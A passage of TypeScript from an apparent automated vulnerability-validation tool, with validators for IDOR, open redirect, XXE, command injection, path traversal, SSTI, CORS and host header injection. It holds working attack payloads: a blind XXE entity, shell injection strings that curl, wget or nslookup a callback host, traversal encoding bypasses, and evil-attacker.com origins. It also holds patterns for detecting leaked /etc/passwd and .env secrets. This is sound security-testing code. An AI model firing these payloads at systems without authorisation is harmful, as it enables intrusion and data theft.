  // Step 1: Primary identity — the agent's original request.
  const result1 = await config.executeCommand(
    buildCurlArgv({
      url: finding.target, dumpHeaders: true,
      authHeaders: config.authHeaders, authCookies: config.authCookies,
    }),
    finding.target
  );
  evidence.push({
    type: 'http_response',
    description: `Response as ${config.primaryAuthLabel ?? 'primary'} identity`,
    data: result1.stdout.substring(0, 5000),
    timestamp: Date.now(),
  });

  const statusMatch = result1.stdout.match(/HTTP\/[\d.]+ (\d{3})/);
  const primaryStatus = statusMatch ? parseInt(statusMatch[1], 10) : 0;
  steps.push(`Primary identity (${config.primaryAuthLabel ?? '?'}) → HTTP ${primaryStatus}`);

  let confirmed = false;
  let confidence = finding.confidence;

  // Status-code gate (same as before — needed for the no-second-identity case).
  const statusOnlyConfirmed = primaryStatus === 200 && result1.stdout.length > 200;
  if (statusOnlyConfirmed) {
    confirmed = true;
    confidence = Math.min(100, confidence + 15);
  }
  if (primaryStatus === 401 || primaryStatus === 403) {
    confidence = Math.max(0, confidence - 40);
  }

  // Step 2: Secondary-identity differential (only when available).
  let differentialConfirmed = false;
  if (config.secondaryAuthHeaders || config.secondaryAuthCookies) {
    const result2 = await config.executeCommand(
      buildCurlArgv({
        url: finding.target, dumpHeaders: true,
        authHeaders: config.secondaryAuthHeaders, authCookies: config.secondaryAuthCookies,
      }),
      finding.target
    );
    evidence.push({
      type: 'http_response',
      description: `Response as ${config.secondaryAuthLabel ?? 'secondary'} identity`,
      data: result2.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });
    const secStatusMatch = result2.stdout.match(/HTTP\/[\d.]+ (\d{3})/);
    const secondaryStatus = secStatusMatch ? parseInt(secStatusMatch[1], 10) : 0;
    steps.push(`Secondary identity (${config.secondaryAuthLabel ?? '?'}) → HTTP ${secondaryStatus}`);

    // Strip HTTP headers from both bodies for a body-only compare.
    const primaryBody = result1.stdout.replace(/^[\s\S]*?\r?\n\r?\n/, '');
    const secondaryBody = result2.stdout.replace(/^[\s\S]*?\r?\n\r?\n/, '');

    // Same-body-different-identity = confirmed broken access. The secondary
    // identity shouldn't see the primary's data; the fact that it does
    // proves ownership isn't checked. Length threshold guards against
    // "identical empty response" false matches (e.g. both hitting a blank
    // 404 page) without making the check too strict to flag short JSON.
    const IDENTICAL_BODY_MIN_BYTES = 10;
    if (
      secondaryStatus === 200
      && secondaryBody.length > IDENTICAL_BODY_MIN_BYTES
      && primaryBody.length > IDENTICAL_BODY_MIN_BYTES
      && primaryBody === secondaryBody
    ) {
      differentialConfirmed = true;
      confirmed = true;
      confidence = Math.min(100, confidence + 40);
      steps.push(`✓ DIFFERENTIAL CONFIRMED: secondary identity sees identical response body (${secondaryBody.length} bytes) — broken access`);
      evidence.push({
        type: 'diff',
        description: 'Primary and secondary identities returned identical bodies',
        data: `Primary body length: ${primaryBody.length}\nSecondary body length: ${secondaryBody.length}\nIdentical: YES`,
        timestamp: Date.now(),
      });
    } else if (secondaryStatus === 200 && secondaryBody.length > IDENTICAL_BODY_MIN_BYTES) {
      // Secondary got a 200 but different content — still suggestive; the
      // resource is accessible but content may be per-identity. Partial hit.
      confidence = Math.min(100, confidence + 20);
      steps.push(`Partial signal: secondary returns 200 with ${secondaryBody.length} bytes — data may be per-identity`);
    } else {
      steps.push(`Secondary identity access denied (HTTP ${secondaryStatus}) — primary's 200 may be legitimate ownership`);
      // If we had only status-only confirmation, downgrade — the second
      // identity can't see the data, which suggests ownership *is* checked.
      if (statusOnlyConfirmed && !differentialConfirmed) {
        confirmed = false;
        confidence = Math.max(0, confidence - 15);
      }
    }
  } else {
    steps.push('No secondary identity configured — differential check skipped');
  }

  return {
    findingId: finding.id,
    confirmed,
    evidence,
    reproductionSteps: steps,
    confidence,
    validatorUsed: differentialConfirmed
      ? `${validatorLabel}_differential`
      : validatorLabel,
    validationTime: Date.now() - startTime,
  };
}

registerValidator({
  vulnType: 'idor',
  async validate(finding, config): Promise<ValidationResult> {
    return validateBrokenAccess(finding, config, 'idor');
  },
});


// ─── Open Redirect Validator ─────────────────────────────────────────────────

registerValidator({
  vulnType: 'open_redirect',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    // Follow redirects and check final location.
    // No auth pass-through: `curl -L` re-sends custom headers on every
    // redirect hop including cross-origin ones. The whole point of this
    // validator is to detect redirects that escape scope — sending the
    // user's bearer/cookies to whatever attacker-chosen host the open
    // redirect lands on would be a classic credential-leak bug in our
    // own tooling. Revisit if curl grows per-hop header scoping.
    const result = await config.executeCommand(
      buildCurlArgv({
        url: finding.target, dumpHeaders: true, discardBody: true,
        followRedirects: true, maxRedirects: 5,
      }),
      finding.target
    );

    const locationHeaders = result.stdout.match(/location:\s*(\S+)/gi) || [];
    evidence.push({
      type: 'http_response',
      description: 'Redirect chain headers',
      data: locationHeaders.join('\n'),
      timestamp: Date.now(),
    });

    // Check if any redirect goes to an external domain
    const externalRedirect = locationHeaders.some(h => {
      const url = h.replace(/location:\s*/i, '');
      try {
        const parsed = new URL(url);
        return !finding.target.includes(parsed.hostname);
      } catch {
        return false;
      }
    });

    steps.push(`Redirect chain: ${locationHeaders.length} hops`);
    steps.push(`External redirect: ${externalRedirect ? 'YES' : 'no'}`);

    return {
      findingId: finding.id,
      confirmed: externalRedirect,
      evidence,
      reproductionSteps: steps,
      confidence: externalRedirect ? Math.min(100, finding.confidence + 25) : Math.max(0, finding.confidence - 20),
      validatorUsed: 'open_redirect',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── XXE Validator ──────────────────────────────────────────────────────────

// ─── XXE Validator ──────────────────────────────────────────────────────────
// Two confirmation paths:
//   1. Direct-echo XXE — replay the agent's original request and look for
//      /etc/passwd / win.ini / os-release / web.xml fingerprints in the
//      response body.
//   2. Blind XXE — synthesize a real XXE payload that references an OOB
//      DTD URL, POST it to the target as XML, and wait for the XML parser
//      to fetch our OOB host. This is the classic blind-XXE proof
//      (external parameter entity fetching a remote DTD) and works even
//      when the response body never echoes file content.

registerValidator({
  vulnType: 'xxe',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    // Step 1: Direct echo — replay the agent's original request.
    const result = await config.executeCommand(
      buildCurlArgv({ url: finding.target, authHeaders: config.authHeaders, authCookies: config.authCookies }),
      finding.target
    );

    const passwdIndicators = [
      /root:x?:0:0:/,
      /daemon:x?:\d+:\d+:/,
      /nobody:x?:\d+:\d+:/,
      /bin\/bash/,
      /bin\/sh/,
      /sbin\/nologin/,
    ];
    const fileContentIndicators = [
      /\[extensions\]/i,
      /\[fonts\]/i,
      /PRETTY_NAME=/,
      /VERSION_ID=/,
    ];
    const hasPasswd = passwdIndicators.some(p => p.test(result.stdout));
    const hasFileContent = fileContentIndicators.some(p => p.test(result.stdout));

    evidence.push({
      type: 'http_response',
      description: 'Response from XXE payload (direct-echo probe)',
      data: result.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });

    steps.push(`Direct-echo probe → /etc/passwd:${hasPasswd ? 'YES' : 'no'}, other:${hasFileContent ? 'YES' : 'no'}`);

    let confirmed = hasPasswd || hasFileContent;
    let confidence = finding.confidence;
    if (hasPasswd) confidence = Math.min(100, confidence + 35);
    if (hasFileContent) confidence = Math.min(100, confidence + 25);

    // Step 2: Blind-XXE probe via OOB DTD fetch. Only fire if the direct
    // echo didn't already confirm — saves ~2s of waiting on easy hits.
    let blindOobConfirmed = false;
    if (!confirmed && validatorOobServer) {
      const callback = validatorOobServer.generateCallbackUrl({
        vulnerabilityType: 'xxe',
        target: finding.target,
        parameter: 'xml-body',
        agentId: finding.agentId ?? 'validator',
      });
      const oobUrl = validatorOobServer.getHttpUrl(callback);

      // Classic blind-XXE payload: external parameter entity references
      // the OOB DTD. When the parser dereferences the entity to build the
      // document, it fetches the OOB URL.
      const xxePayload = [
        `<?xml version="1.0" encoding="UTF-8"?>`,
        `<!DOCTYPE foo [`,
        `  <!ENTITY % remote SYSTEM "${oobUrl}">`,
        `  %remote;`,
        `]>`,
        `<foo>huntress-xxe-probe</foo>`,
      ].join('\n');

      steps.push(`Blind-XXE probe → POST XML body referencing ${oobUrl}`);
      await config.executeCommand(
        buildCurlArgv({
          url: finding.target, method: 'POST',
          body: xxePayload, contentType: 'application/xml',
          authHeaders: config.authHeaders, authCookies: config.authCookies,
        }),
        finding.target
      );
      await sleep(3000);

      if (validatorOobServer.isTriggered(callback.id)) {
        blindOobConfirmed = true;
        confirmed = true;
        confidence = Math.min(100, confidence + 40);
        const cb = validatorOobServer.getTriggeredCallbacks().find(c => c.id === callback.id);
        evidence.push({
          type: 'callback',
          description: `Blind XXE OOB callback: XML parser fetched our remote DTD`,
          data: `Callback ID: ${callback.id}\nOOB URL: ${oobUrl}\nSource IP: ${cb?.interaction?.sourceIp ?? 'unknown'}\nProtocol: ${cb?.interaction?.protocol ?? 'unknown'}\nPayload:\n${xxePayload}`,
          timestamp: Date.now(),
        });
        evidence.push({
          type: 'http_request',
          description: 'XXE payload sent to target',
          data: xxePayload,
          timestamp: Date.now(),
        });
        steps.push(`✓ BLIND XXE CONFIRMED via OOB DTD fetch`);
      } else {
        steps.push(`Blind-XXE probe: no OOB callback within 3s`);
      }
    } else if (!confirmed) {
      steps.push('OOB server not available — blind-XXE probe skipped');
    }

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: blindOobConfirmed
        ? 'xxe_blind_oob'
        : (hasPasswd || hasFileContent)
          ? 'xxe_direct_echo'
          : 'xxe',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── Command Injection Validator ────────────────────────────────────────────
// Three confirmation paths:
//   1. Command-output indicators in response body (uid=/Linux/etc/passwd).
//   2. Timing anomaly — baseline vs. original payload (delay shells hit here).
//   3. Active OOB injection — synthesize a `curl OOB` / `wget OOB` payload,
//      substitute into the target's URL-param slot, wait for a callback.
//      Same pattern as the SSRF active-OOB branch; deterministic proof that
//      shell exec happened server-side.

registerValidator({
  vulnType: 'command_injection',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    // Step 1: Send the original payload and check for command output
    const result = await config.executeCommand(
      buildCurlArgv({ url: finding.target, authHeaders: config.authHeaders, authCookies: config.authCookies }),
      finding.target
    );

    const cmdOutputIndicators = [
      /uid=\d+\(\w+\)\s+gid=\d+/,
      /\w+\\\w+/,
      /Linux\s+\S+\s+\d+\.\d+/,
      /root:x:0:0:/,
    ];
    const hasCmdOutput = cmdOutputIndicators.some(p => p.test(result.stdout));

    evidence.push({
      type: 'http_response',
      description: 'Response containing potential command output',
      data: result.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });

    steps.push(`Sent injection payload to: ${finding.target}`);
    steps.push(`Command output indicators found: ${hasCmdOutput ? 'YES' : 'no'}`);

    // Step 2: Time-based confirmation — baseline without payload vs. original.
    const cleanTarget = finding.target.replace(/[;&|`$()]+.*$/, '');
    const baselineResult = await config.executeCommand(
      buildCurlArgv({
        url: cleanTarget, discardBody: true, writeOut: '%{time_total}',
        authHeaders: config.authHeaders, authCookies: config.authCookies,
      }),
      finding.target
    );
    const baselineTime = parseFloat(baselineResult.stdout) * 1000;

    const delayResult = await config.executeCommand(
      buildCurlArgv({
        url: finding.target, discardBody: true, writeOut: '%{time_total}',
        authHeaders: config.authHeaders, authCookies: config.authCookies,
      }),
      finding.target
    );
    const delayTime = parseFloat(delayResult.stdout) * 1000;

    const timeDiff = delayTime - baselineTime;
    const hasTimingAnomaly = timeDiff > 4000;

    evidence.push({
      type: 'timing',
      description: `Baseline: ${baselineTime.toFixed(0)}ms, Injected: ${delayTime.toFixed(0)}ms`,
      data: `Difference: ${timeDiff.toFixed(0)}ms`,
      timestamp: Date.now(),
    });

    steps.push(`Baseline response time: ${baselineTime.toFixed(0)}ms`);
    steps.push(`Injected response time: ${delayTime.toFixed(0)}ms`);
    steps.push(`Time difference: ${timeDiff.toFixed(0)}ms (threshold: 4000ms)`);

    // Step 3: Active OOB injection. Substitute a shell-exec'd curl to our
    // OOB host into the URL-param slot. If the server runs the command,
    // the OOB server sees a DNS/HTTP hit on our unique subdomain.
    let oobConfirmed = false;
    if (validatorOobServer) {
      const callback = validatorOobServer.generateCallbackUrl({
        vulnerabilityType: 'command_injection',
        target: finding.target,
        parameter: 'cmd',
        agentId: finding.agentId ?? 'validator',
      });
      const oobUrl = validatorOobServer.getHttpUrl(callback);
      // Backtick + $() variants handle different shell contexts. nslookup/curl
      // variants handle different tool availability inside the target.
      const shellPayloads = [
        `;curl ${oobUrl}`,
        `$(curl ${oobUrl})`,
        `\`curl ${oobUrl}\``,
        `|wget -qO- ${oobUrl}`,
        `;nslookup ${callback.callbackUrl}`,
      ];

      for (const payload of shellPayloads) {
        const probeUrl = substituteUrlValue(finding.target, payload);
        steps.push(`Active OOB probe: ${payload}`);
        await config.executeCommand(
          buildCurlArgv({ url: probeUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
          finding.target
        );
        await sleep(2000);
        if (validatorOobServer.isTriggered(callback.id)) {
          oobConfirmed = true;
          const cb = validatorOobServer.getTriggeredCallbacks().find(c => c.id === callback.id);
          evidence.push({
            type: 'callback',
            description: `Shell exec OOB callback via ${payload}`,
            data: `Callback ID: ${callback.id}\nPayload: ${payload}\nSource IP: ${cb?.interaction?.sourceIp ?? 'unknown'}`,
            timestamp: Date.now(),
          });
          steps.push(`✓ Shell exec CONFIRMED via ${payload}`);
          break;
        }
      }

      if (!oobConfirmed) steps.push('Active OOB: no callback after all shell variants');
    } else {
      steps.push('OOB server not available — active shell-exec probe skipped');
    }

    const confirmed = hasCmdOutput || hasTimingAnomaly || oobConfirmed;
    let confidence = finding.confidence;
    if (hasCmdOutput) confidence = Math.min(100, confidence + 30);
    if (hasTimingAnomaly) confidence = Math.min(100, confidence + 25);
    if (oobConfirmed) confidence = Math.min(100, confidence + 40);

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: oobConfirmed
        ? 'command_injection_oob'
        : hasCmdOutput
          ? 'command_injection_output'
          : hasTimingAnomaly
            ? 'command_injection_timing'
            : 'command_injection',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── Path Traversal Validator ───────────────────────────────────────────────
// File-content indicator scan across multiple encoding bypass variants. The
// agent's original payload is tried first; if none of the fingerprints hit,
// we swap `../` for `%2e%2e%2f`, `%252e%252e%252f`, `..%2f`, `....//`, and
// `..\..\` and try each. First variant whose response contains /etc/passwd,
// win.ini, web.xml, or .env fingerprints wins — with a clean-URL negative
// control to reject page-default content that happens to match.

/** Build encoding bypass variants of a path-traversal URL.
 *  Exported for unit tests. */
export function buildPathTraversalVariants(url: string): Array<{ label: string; url: string }> {
  const variants: Array<{ label: string; url: string }> = [
    { label: 'original', url },
  ];
  const replacements: Array<[string, RegExp, string]> = [
    ['url-encoded', /\.\.\//g, '%2e%2e%2f'],
    ['double-url-encoded', /\.\.\//g, '%252e%252e%252f'],
    ['mixed-encoding', /\.\.\//g, '..%2f'],
    ['overlong', /\.\.\//g, '....//'],
    ['backslash', /\.\.\//g, '..\\'],
  ];
  for (const [label, pattern, repl] of replacements) {
    if (!pattern.test(url)) continue;
    const mutated = url.replace(pattern, repl);
    if (mutated !== url) variants.push({ label, url: mutated });
  }
  return variants;
}

function detectTraversedFile(stdout: string): { kind: string; confidenceDelta: number } | null {
  if ([/root:x?:0:0:/, /daemon:x?:\d+:\d+:/, /nobody:x?:\d+:\d+:/, /sbin\/nologin/].some(p => p.test(stdout))) {
    return { kind: '/etc/passwd', confidenceDelta: 35 };
  }
  if ([/\[extensions\]/i, /\[fonts\]/i, /\[mci extensions\]/i].some(p => p.test(stdout))) {
    return { kind: 'Windows win.ini', confidenceDelta: 30 };
  }
  if ([/<web-app/i, /<servlet>/i, /<servlet-mapping>/i].some(p => p.test(stdout))) {
    return { kind: 'Java web.xml', confidenceDelta: 25 };
  }
  if ([/DB_PASSWORD=/i, /API_KEY=/i, /SECRET_KEY=/i].some(p => p.test(stdout))
      || /^[A-Z_]+=.+$/m.test(stdout)) {
    return { kind: '.env', confidenceDelta: 20 };
  }
  return null;
}

registerValidator({
  vulnType: 'path_traversal',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    // Clean-URL negative control — strip the traversal fragment to get the
    // bare endpoint, so we can distinguish payload-induced file leaks from
    // static content that happens to match our fingerprints.
    const cleanUrl = finding.target.replace(/(\.\.\/|%2e%2e%2f|\.\.\\\\|....\/\/).*$/i, '');
    if (cleanUrl !== finding.target) {
      const cleanResult = await config.executeCommand(
        buildCurlArgv({ url: cleanUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
        finding.target
      );
      if (detectTraversedFile(cleanResult.stdout)) {
        steps.push(`FALSE POSITIVE: clean URL ${cleanUrl} already shows file-content indicators — path traversal cannot be confirmed from this target`);
        return {
          findingId: finding.id,
          confirmed: false,
          evidence,
          reproductionSteps: steps,
          confidence: Math.max(0, finding.confidence - 40),
          validatorUsed: 'path_traversal',
          validationTime: Date.now() - startTime,
        };
      }
    }

    const variants = buildPathTraversalVariants(finding.target);
    steps.push(`Testing ${variants.length} encoding variant(s)`);

    let confirmed = false;
    let firingVariant: string | null = null;
    let detectedFile: string | null = null;
    let confidence = finding.confidence;

    for (const variant of variants) {
      const result = await config.executeCommand(
        buildCurlArgv({ url: variant.url, authHeaders: config.authHeaders, authCookies: config.authCookies }),
        finding.target
      );
      const hit = detectTraversedFile(result.stdout);
      if (!hit) {
        steps.push(`  ${variant.label}: no file content detected`);
        continue;
      }
      confirmed = true;
      firingVariant = variant.label;
      detectedFile = hit.kind;
      confidence = Math.min(100, confidence + hit.confidenceDelta);
      evidence.push({
        type: 'http_response',
        description: `${variant.label} bypass leaked ${hit.kind}`,
        data: result.stdout.substring(0, 5000),
        timestamp: Date.now(),
      });
      steps.push(`  ✓ ${variant.label} → ${hit.kind} leaked`);
      break;
    }

    if (!confirmed) steps.push('No encoding variant produced file-content indicators');

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: firingVariant && detectedFile
        ? `path_traversal (${firingVariant}, ${detectedFile})`
        : 'path_traversal',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── SSTI Validator ─────────────────────────────────────────────────────────

/**
 * Body parameter names commonly injected for SSTI probing. Covers the
 * 2026-04-23 Juice Shop finding (`quantity` on POST /api/BasketItems) plus
 * the canonical body-param positions seen across real H1 programs.
 */
const SSTI_BODY_FIELDS = [
  'quantity', 'test', 'input', 'content', 'message',
  'data', 'name', 'template', 'value', 'text',
] as const;

/** Run a single SSTI probe variant (GET query or POST body) and return the
 *  stdout for 49 / 7777777 inspection. Pulls auth from `config` so
 *  auth-gated endpoints are actually reachable. */
async function runSstiProbe(
  config: ValidatorConfig,
  target: string,
  probe:
    | { kind: 'get_query'; url: string }
    | { kind: 'post_body'; url: string; field: string; payload: string },
): Promise<string> {
  let command: string;
  if (probe.kind === 'get_query') {
    command = buildCurlArgv({
      url: probe.url,
      method: 'GET',
      authHeaders: config.authHeaders,
      authCookies: config.authCookies,
    });
  } else {
    command = buildCurlArgv({
      url: probe.url,
      method: 'POST',
      body: JSON.stringify({ [probe.field]: probe.payload }),
      contentType: 'application/json',
      authHeaders: config.authHeaders,
      authCookies: config.authCookies,
    });
  }
  const result = await config.executeCommand(command, target);
  return result.stdout;
}

registerValidator({
  vulnType: 'ssti',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    const targetUrl = finding.target;
    let confirmed = false;
    let confidence = finding.confidence;
    let detectedEngine = 'unknown';
    let injectionSite: string | null = null;

    // Build the candidate injection sites. GET query is the classic fast
    // path; POST-body sweep handles API endpoints where the SSTI lives in
    // a JSON field (e.g. the 2026-04-23 Pug SSTI on `quantity`).
    const mathPayload = targetUrl.replace(/(\{\{.*?\}\}|%7B%7B.*?%7D%7D)/, '{{7*7}}');
    const mathUrl = mathPayload === targetUrl
      ? (targetUrl.includes('?') ? `${targetUrl}&test={{7*7}}` : `${targetUrl}?test={{7*7}}`)
      : mathPayload;
    const fingerUrl = mathUrl.replace('{{7*7}}', "{{7*'7'}}");

    type Site = {
      label: string;
      mathProbe: Parameters<typeof runSstiProbe>[2];
      fingerProbe: Parameters<typeof runSstiProbe>[2];
      cleanProbe: Parameters<typeof runSstiProbe>[2];
    };

    const sites: Site[] = [
      {
        label: 'GET query',
        mathProbe: { kind: 'get_query', url: mathUrl },
        fingerProbe: { kind: 'get_query', url: fingerUrl },
        cleanProbe: { kind: 'get_query', url: mathUrl.replace('{{7*7}}', 'notatemplate') },
      },
      // POST-body probes — one per candidate field, constrained to a small
      // canonical list. Only fire for endpoints that look like APIs to avoid
      // burning budget on static targets. Heuristic: path contains /api/ or
      // /rest/, or the finding's description mentions a method/body field.
      ...((/\/(api|rest|v\d+)\//i.test(targetUrl)
           || /POST|PUT|PATCH/i.test(finding.description ?? '')
           || /body|field|parameter/i.test(finding.description ?? '')
          )
        ? SSTI_BODY_FIELDS.map((field): Site => ({
            label: `POST body field "${field}"`,
            mathProbe: { kind: 'post_body', url: targetUrl, field, payload: '{{7*7}}' },
            fingerProbe: { kind: 'post_body', url: targetUrl, field, payload: "{{7*'7'}}" },
            cleanProbe: { kind: 'post_body', url: targetUrl, field, payload: 'notatemplate' },
          }))
        : []),
    ];

    steps.push(`Testing ${sites.length} injection site(s) against ${targetUrl}`);

    for (const site of sites) {
      steps.push(`--- Trying ${site.label} ---`);

      const mathStdout = await runSstiProbe(config, finding.target, site.mathProbe);
      const has49 = mathStdout.includes('49');
      if (!has49) {
        steps.push(`  Response does not contain "49" — skipping ${site.label}`);
        continue;
      }

      evidence.push({
        type: 'http_response',
        description: `${site.label}: response to {{7*7}} payload`,
        data: mathStdout.substring(0, 5000),
        timestamp: Date.now(),
      });

      const fingerStdout = await runSstiProbe(config, finding.target, site.fingerProbe);
      const has7777777 = fingerStdout.includes('7777777');
      const still49 = fingerStdout.includes('49');

      evidence.push({
        type: 'http_response',
        description: `${site.label}: response to {{7*'7'}} fingerprint`,
        data: fingerStdout.substring(0, 5000),
        timestamp: Date.now(),
      });

      // Negative control — make sure the page doesn't always emit "49".
      const cleanStdout = await runSstiProbe(config, finding.target, site.cleanProbe);
      if (cleanStdout.includes('49')) {
        steps.push(`  FALSE POSITIVE: clean (${site.label}) also contains "49" — discarding`);
        continue;
      }

      // Real hit — score and fingerprint the engine.
      let siteConfidence = 20;
      if (has7777777) {
        detectedEngine = 'Jinja2/Python';
        siteConfidence += 30;
      } else if (still49) {
        detectedEngine = 'Twig/PHP or Mako or Pug';
        siteConfidence += 25;
      } else {
        detectedEngine = 'unknown (math evaluated)';
        siteConfidence += 15;
      }

      confirmed = true;
      confidence = Math.min(100, confidence + siteConfidence);
      injectionSite = site.label;
      steps.push(`  ✓ CONFIRMED at ${site.label} — engine: ${detectedEngine}`);
      break; // first confirmed site wins
    }

    if (!confirmed) {
      steps.push('No injection site confirmed SSTI');
    }

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: injectionSite
        ? `ssti (${injectionSite}, ${detectedEngine})`
        : 'ssti',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── CORS Misconfiguration Validator ─────────────────────────────────────────

registerValidator({
  vulnType: 'cors_misconfiguration',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    const targetUrl = finding.target;
    let confirmed = false;
    let confidence = finding.confidence;

    // Step 1: Send request with an attacker-controlled origin
    const evilOrigin = 'https://evil-attacker.com';
    const result1 = await config.executeCommand(
      buildCurlArgv({
        url: targetUrl, dumpHeaders: true,
        headers: { 'Origin': evilOrigin },
        authHeaders: config.authHeaders, authCookies: config.authCookies,
      }),
      finding.target
    );

    evidence.push({
      type: 'http_response',
      description: `Response to Origin: ${evilOrigin}`,
      data: result1.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });

    // Parse ACAO and ACAC headers
    const acaoMatch = result1.stdout.match(/access-control-allow-origin:\s*(\S+)/i);
    const acacMatch = result1.stdout.match(/access-control-allow-credentials:\s*(\S+)/i);
    const acaoValue = acaoMatch ? acaoMatch[1] : null;
    const acacValue = acacMatch ? acacMatch[1].toLowerCase() : null;

    steps.push(`Sent Origin: ${evilOrigin}`);
    steps.push(`ACAO header: ${acaoValue ?? 'not present'}`);
    steps.push(`ACAC header: ${acacValue ?? 'not present'}`);

    // Reflected origin with credentials = confirmed CORS misconfiguration
    if (acaoValue === evilOrigin && acacValue === 'true') {
      confirmed = true;
      confidence = Math.min(100, confidence + 40);
      steps.push('CRITICAL: Arbitrary origin reflected with credentials allowed');
    } else if (acaoValue === '*' && acacValue === 'true') {
      // Wildcard with credentials — browser blocks this, but it's still a misconfiguration
      confirmed = true;
      confidence = Math.min(100, confidence + 20);
      steps.push('Wildcard ACAO with ACAC:true — misconfigured (browsers block this combo)');
    } else if (acaoValue === evilOrigin) {
      // Reflected origin without credentials
      confidence = Math.min(100, confidence + 15);
      steps.push('Origin reflected but no credentials — lower impact');
    }

    // Step 2: Test null origin (used in sandboxed iframes, data: URIs)
    if (!confirmed) {
      const result2 = await config.executeCommand(
        buildCurlArgv({
          url: targetUrl, dumpHeaders: true,
          headers: { 'Origin': 'null' },
          authHeaders: config.authHeaders, authCookies: config.authCookies,
        }),
        finding.target
      );

      const nullAcao = result2.stdout.match(/access-control-allow-origin:\s*(\S+)/i);
      const nullAcac = result2.stdout.match(/access-control-allow-credentials:\s*(\S+)/i);

      if (nullAcao && nullAcao[1] === 'null' && nullAcac && nullAcac[1].toLowerCase() === 'true') {
        confirmed = true;
        confidence = Math.min(100, confidence + 35);
        steps.push('null origin accepted with credentials — exploitable via sandboxed iframe');

        evidence.push({
          type: 'http_response',
          description: 'Response to Origin: null',
          data: result2.stdout.substring(0, 5000),
          timestamp: Date.now(),
        });
      } else {
        steps.push(`null origin: ACAO=${nullAcao?.[1] ?? 'none'}, ACAC=${nullAcac?.[1] ?? 'none'}`);
      }
    }

    // Step 3: Test if the origin is reflected back dynamically (regex bypass)
    if (!confirmed) {
      // Try a subdomain-style bypass: evil.com.target.com or targetsite.evil.com
      let targetHost = '';
      try {
        targetHost = new URL(targetUrl.startsWith('http') ? targetUrl : `https://${targetUrl}`).hostname;
      } catch { /* ignore */ }

      if (targetHost) {
        const subdomainBypass = `https://${targetHost}.evil-attacker.com`;
        const result3 = await config.executeCommand(
          buildCurlArgv({
            url: targetUrl, dumpHeaders: true,
            headers: { 'Origin': subdomainBypass },
            authHeaders: config.authHeaders, authCookies: config.authCookies,
          }),
          finding.target
        );

        const bypassAcao = result3.stdout.match(/access-control-allow-origin:\s*(\S+)/i);
        if (bypassAcao && bypassAcao[1] === subdomainBypass) {
          confirmed = true;
          confidence = Math.min(100, confidence + 30);
          steps.push(`Regex bypass: ${subdomainBypass} accepted — suffix matching vulnerability`);

          evidence.push({
            type: 'http_response',
            description: `Response to subdomain bypass origin: ${subdomainBypass}`,
            data: result3.stdout.substring(0, 5000),
            timestamp: Date.now(),
          });
        }
      }
    }

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'cors_misconfiguration',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── Host Header Injection Validator ────────────────────────────────────────
// Sweeps the canonical override-header set. First variant where the injected
// host reflects in a Location header (strongest signal — confirms routing
// uses the attacker-controlled value) wins. A body-only reflection marks
// "potentially exploitable" but requires a clean-request negative control
// to rule out a page-default string that happens to contain the evil host.

/** Override-header variants tried in order by the host-header validator.
 *  Exported for unit tests. */
export const HOST_OVERRIDE_HEADERS = [
  'Host',
  'X-Forwarded-Host',
  'X-Forwarded-Server',
  'X-Host',
  'X-Original-URL',
  'X-Rewrite-URL',
  'Forwarded',
] as const;

registerValidator({
  vulnType: 'host_header_injection',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    const targetUrl = finding.target;
    const evilHost = 'evil-attacker.com';
    let confirmed = false;
    let firingHeader: string | null = null;
    let reflectedInRedirect = false;
    let reflectedInBody = false;
    let confidence = finding.confidence;

    for (const headerName of HOST_OVERRIDE_HEADERS) {
      // `Forwarded` follows RFC 7239 syntax (`host=evil`), not a bare value.
      const headerValue = headerName === 'Forwarded' ? `host=${evilHost}` : evilHost;

      const result = await config.executeCommand(
        buildCurlArgv({
          url: targetUrl, dumpHeaders: true,
          headers: { [headerName]: headerValue },
          authHeaders: config.authHeaders, authCookies: config.authCookies,
        }),
        finding.target
      );

      const body = result.stdout.toLowerCase();
      const bodyHit = body.includes(evilHost);
      const locationMatch = result.stdout.match(/location:\s*(\S+)/i);
      const redirectHit = !!locationMatch && locationMatch[1].toLowerCase().includes(evilHost);

      steps.push(`${headerName}: ${headerValue} — body:${bodyHit ? 'YES' : 'no'}, redirect:${redirectHit ? 'YES' : 'no'}`);

      if (bodyHit || redirectHit) {
        evidence.push({
          type: 'http_response',
          description: `${headerName}: ${headerValue} reflection`,
          data: result.stdout.substring(0, 5000),
          timestamp: Date.now(),
        });
      }

      if (redirectHit) {
        // Strongest signal — a server that routes/redirects based on the
        // injected header is definitionally vulnerable. No false-positive
        // path for this case.
        confirmed = true;
        firingHeader = headerName;
